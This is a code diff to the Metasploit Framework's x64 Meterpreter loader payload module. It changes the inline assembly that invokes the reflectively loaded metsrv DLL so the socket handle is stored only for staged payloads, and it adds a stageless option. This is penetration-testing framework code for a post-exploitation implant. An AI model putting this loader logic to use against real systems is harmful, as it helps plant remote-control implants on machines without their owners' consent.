@@ -52,8 +52,16 @@ module Payload::Windows::MeterpreterLoader_x64
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
           ; offset from ReflectiveLoader() to the end of the DLL
           add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
+    ^
+
+    unless opts[:stageless]
+      asm << %Q^
           ; store the comms socket handle
           mov dword ptr [rbx], edi
+      ^
+    end
+
+    asm << %Q^
           mov r8, rbx           ; r8 points to the extension list
           push 4                ; push up 4, indicate that we have attached
           pop rdx               ; pop 4 into rdx
@@ -61,13 +69,14 @@ module Payload::Windows::MeterpreterLoader_x64
     ^
   end
 
-  def stage_meterpreter
+  def stage_meterpreter(stageless=false)
     # Exceptions will be thrown by the mixin if there are issues.
     dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x64.dll'))
 
     asm_opts = {
       :rdi_offset => offset,
-      :length     => dll.length
+      :length     => dll.length,
+      :stageless  => stageless
     }
 
     asm = asm_invoke_metsrv(asm_opts)
